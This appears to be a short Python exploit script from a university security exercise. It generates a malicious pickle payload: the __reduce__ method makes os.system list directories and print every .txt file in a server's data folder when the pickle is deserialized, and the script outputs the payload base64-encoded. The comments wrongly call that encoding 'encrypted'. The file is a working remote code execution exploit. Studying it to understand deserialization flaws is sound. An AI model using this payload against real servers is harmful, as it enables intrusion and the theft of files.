#
#   file: pickle_exploit.py
#   author: Jan ZÃ¡drapa, BUT FIT
#   date: 3/2022
#   brief: code creating RCE on server where pickle deserializes data
#Similar code can be found here:
#https://davidhamann.de/2020/04/05/exploiting-python-pickle/
import pickle
import base64
import os

#remote code execution
class RCE:
    #overriding the pickle object creation and adding command to it
    def __reduce__(self):
        #command we want to run on the server
        command = ('ls -a && cd data && ls -a && cat *.txt')
        return os.system, (command,)

#run and print pickled and encrypted command
if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    #print(pickled)
    print(base64.urlsafe_b64encode(pickled))